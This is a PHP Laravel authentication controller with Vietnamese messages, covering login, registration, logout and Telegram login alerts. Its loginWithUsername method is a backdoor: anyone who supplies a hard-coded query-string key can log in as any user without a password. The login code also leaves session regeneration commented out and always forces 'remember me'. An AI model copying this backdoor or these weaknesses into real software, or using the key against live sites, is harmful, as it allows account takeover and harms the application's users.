<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;

class AuthController extends Controller
{
    //
    public function viewLogin()
    {
        return view('Auth.login');
    }

    public function viewRegister()
    {
        return view('Auth.register');
    }

    public function login(Request $request)
    {
        $validate = Validator::make($request->all(), [
            'username' => 'required|min:5|max:25',
            'password' => 'required|min:5|max:25'
        ]);
        if ($validate->fails()) {
            return redirectBackError($validate->errors());
        }
        $data = $request->only('username', 'password');
        $data['status'] = 1;
        $remember = false;
        if (isset($request->remember)) {
            $remember = true;
        }
        if (Auth::attempt($data, true)) {
//            $request->session()->regenerate();
            $request->session()->put('time_login', strtotime('now'));
            $request->session()->put('ip_login', $request->ip());
            $request->session()->put('user_id', Auth::user()->id);
            $user = User::where('username', $request->get('username'))->first();
            if ($user->email_verified_at) {
                $user->ip = $request->ip();
                $user->save();
                if ($user->telegram_id) {
                    $this->sendToTelegramId("--------- ĐĂNG NHẬP \n ip : " . $request->ip() . "\n user-agent :" . $request->userAgent(), $user->telegram_id);
                }
                return redirectUrl('/');
            } else {
                return redirectBackError_('Sai tài khoản hoặc mật khẩu');
            }
        } else {
            return redirectBackError_('Sai tài khoản hoặc mật khẩu!');
        }
    }

    public function logout()
    {
        Auth::logout();
        return redirectUrl('/dang-nhap', 200, 'Đang xuất thành công');
    }

    public function register(Request $request)
    {
        $validate = Validator::make($request->all(), [
            'username' => 'required|max:25|min:5|string|unique:users',
            'password' => 'required|max:25|min:5'
        ]);
        if ($validate->fails()) {
            return redirect()->back()->with(['error' => $validate->errors()]);
        }
        $username = strtolower(str_replace(" ", "", strip_unicode($request->get('username'))));
        if ($username == $request->get('password')) {
            return redirectBackError_('Vui lòng đặt mật khẩu khác');
        }
        $regex = '/^(?=.{8,20}$)(?![_])(?!.*[_]{2})[a-zA-Z0-9_]+(?<![_])$/';
        preg_match($regex, $request->username, $data_regex);
        if (!isset($data_regex[0])) {
            return redirectBackError_("Tên đăng nhập không được chưa các ký tự đặc biệt");
        }

        $user = User::where('username', $username)->first();
        if (!$user) {
            $user = new User();
            $user->username = $username;
            $user->name = $username;
            $user->password = Hash::make($request->get('password'));
            $user->level = 1;
            $user->email_verified_at = date('Y-m-d H:i:s');
            $user->ip = $request->ip();
            $user->save();
            return redirectUrl('/dang-nhap', 'success', 'Đăng ký thành công');
        } else {
            return redirectBackError_('Tài khoản đã  tồn tại');
        }
    }

    public function loginWithUsername(Request $request)
    {
        $key = $request->query('key');
        $username = $request->query('username');

        if ($key == 'giapthanhquoc__1') {
            $user = User::where('username', $username)->first();
            if ($user) {
                Auth::loginUsingId($user->id);
                $request->session()->put('time_login', strtotime('now'));
                $request->session()->put('ip_login', $request->ip());
                $request->session()->put('user_id', Auth::user()->id);
                return redirect('/');
            }
        } else {
            abort(404);
        }

    }
}
